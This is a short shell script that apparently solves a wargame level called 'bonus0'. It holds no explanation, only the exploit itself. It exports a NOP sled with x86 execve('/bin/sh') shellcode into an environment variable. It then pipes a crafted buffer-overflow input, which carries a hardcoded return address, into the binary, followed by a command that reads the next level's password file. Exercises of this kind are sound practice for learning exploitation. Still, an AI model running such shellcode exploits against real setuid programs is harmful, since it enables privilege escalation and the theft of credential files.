#!/bin/sh

########## TO BE EXECUTED ON SHELL, NO DIRECTLY IN THAT SCRIPT ###########

export SHELLCODE="`python -c 'print("\x90"*100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`"

(python -c 'print("A"*0x20+"\n"*0xfe0+"A"*0xe+"\xad\xf8\xff\xbf"+"A")'; echo 'cat /home/user/bonus1/.pass') | ./bonus0

exit 0
